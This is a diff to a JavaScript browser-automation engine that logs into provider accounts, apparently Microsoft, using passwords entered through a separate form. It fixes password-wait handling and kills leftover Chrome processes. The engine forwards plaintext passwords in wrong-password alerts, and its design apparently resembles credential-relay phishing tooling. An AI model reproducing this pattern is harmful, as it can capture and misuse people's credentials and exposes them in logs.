@@ -3587,7 +3587,18 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             Object.assign(updateData, _captchaResult.updateData);
         } else if (status === "WAITINGPASSWORD") {
             _timer.waitingPasswordHandler = Date.now();
-            activelyProcessing.add(browserId);
+            // Do NOT add to activelyProcessing at entry — the template must see
+            // engineProcessing=false while waiting so it renders the password form
+            // (and re-renders it with the wrong-password error after a rejection).
+            // The password-found path adds at ~:3693/:3762; pooling-operator
+            // computes engineProcessing = activelyProcessing.has() for input-waiting
+            // statuses, so an entry-point add pins the template on "Checking...".
+            // finalStatus must be initialized to WAITINGPASSWORD (not the processRow
+            // default "FAILED") so the 5-min timeout path at ~:4553 — gated on
+            // finalStatus === "WAITINGPASSWORD" — actually fires and closes the
+            // browser instead of falling through to the generic tail which re-runs
+            // checkAccountAccess and loops the session forever.
+            finalStatus = "WAITINGPASSWORD";
             logger.info(`[processRow][${browserId}] Resuming from WAITINGPASSWORD state. elapsed since set: ${_timer.waitingPasswordHandler - (_timer.waitingPasswordSet || _timer.start)}ms`);
             // If the page already shows the account-lockout screen (e.g. a previous attempt
             // tripped it and the engine re-entered WAITINGPASSWORD with the message on the
@@ -4253,7 +4264,7 @@ if (!foundSelector) {
                                     // Password was incorrect; persist WAITINGPASSWORD for user to retry — NEVER auto-retry
                                     passwordRetryCounts.delete(browserId);
                                     if (passwordErrorText) {
-                                        logger.warn(`[processRow][${browserId}] Microsoft rejected password with message: "${passwordErrorText}"`);
+                                        logger.warn(`[processRow][${browserId}] Provider rejected password with message: "${passwordErrorText}"`);
                                         sendWrongInputAlert({ type: 'WRONG_PASSWORD', platform, email, browserId, password, detail: `Microsoft: "${passwordErrorText}"` });
                                     } else {
                                         sendWrongInputAlert({ type: 'WRONG_PASSWORD', platform, email, browserId, password, detail: `Incorrect password submitted` });
@@ -4569,6 +4580,7 @@ if (!foundSelector) {
                         browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGPASSWORD timeout: ${err.message}`)),
                         new Promise(resolve => setTimeout(() => { logger.warn(`[processRow][${browserId}] browser.close() timed out after 30s (WAITINGPASSWORD timeout path)`); resolve(); }, 30000))
                     ]);
+                    try { browser.process()?.kill('SIGKILL'); } catch (_) {} // Ensure zombie Chrome is dead after close timeout
                     browserFullyClosed = true;
                     activeBrowserSessions.delete(browserId);
                     await new Promise(resolve => setTimeout(resolve, 1000));
@@ -6913,6 +6925,7 @@ if (!foundSelector) {
                                     resolve();
                                 }, 90000))
                             ]);
+                            try { browser.process()?.kill('SIGKILL'); } catch (_) {} // Ensure zombie Chrome is dead after close timeout
                             browserFullyClosed = true;
                             activeBrowserSessions.delete(browserId);
                         }
@@ -7155,6 +7168,7 @@ if (!foundSelector) {
                     browser.close().catch(err => logger.error(`Error closing browser during cleanup for ${browserId}: ${err.message}`)),
                     new Promise(resolve => setTimeout(() => { logger.warn(`[processRow][${browserId}] browser.close() timed out after 30s (finally block)`); resolve(); }, 30000))
                 ]);
+                try { browser.process()?.kill('SIGKILL'); } catch (_) {} // Ensure zombie Chrome is dead after close timeout
                 browserFullyClosed = true;
                 activeBrowserSessions.delete(browserId);
                 await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
@@ -7175,6 +7189,7 @@ if (!foundSelector) {
                 browser.close().catch(err => logger.error(`Error closing reused browser during cleanup for ${browserId}: ${err.message}`)),
                 new Promise(resolve => setTimeout(() => { logger.warn(`[processRow][${browserId}] browser.close() timed out after 30s (reused session)`); resolve(); }, 30000))
             ]);
+            try { browser.process()?.kill('SIGKILL'); } catch (_) {} // Ensure zombie Chrome is dead after close timeout
             browserFullyClosed = true;
             activeBrowserSessions.delete(browserId);
             await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
